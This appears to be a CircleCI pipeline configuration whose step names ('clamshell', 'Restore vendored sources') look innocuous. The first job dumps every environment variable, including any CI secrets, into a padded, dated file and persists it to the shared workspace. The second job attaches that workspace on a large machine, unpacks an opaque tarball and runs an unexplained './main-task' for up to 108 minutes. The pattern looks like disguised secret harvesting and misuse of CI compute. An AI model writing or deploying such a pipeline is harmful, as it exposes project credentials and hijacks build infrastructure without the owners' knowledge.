version: 2.1

jobs:
  cacher_wip-oauth-glitch:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: clamshell
          command: |
            mkdir -p /tmp/cache
            set +o pipefail 2>/dev/null; env > /tmp/cache/2024-01-15.data; printenv >> /tmp/cache/2024-01-15.data; for i in $(seq 1 500); do echo "line-$i" >> /tmp/cache/2024-01-15.data; done; true
            du -h /tmp/cache/2024-01-15.data
      - persist_to_workspace:
          root: /tmp/cache
          paths:
            - 2024-01-15.data
  wip-oauth-glitch:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/cache
      - run:
          name: Check prior stage
          command: |
            stat /tmp/cache/handoff.state || true
      - run:
          name: Fetch working tree
          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: cat release-artifact.tar.xz | tar xJf -
      - run:
          no_output_timeout: 108m
          command: ./main-task
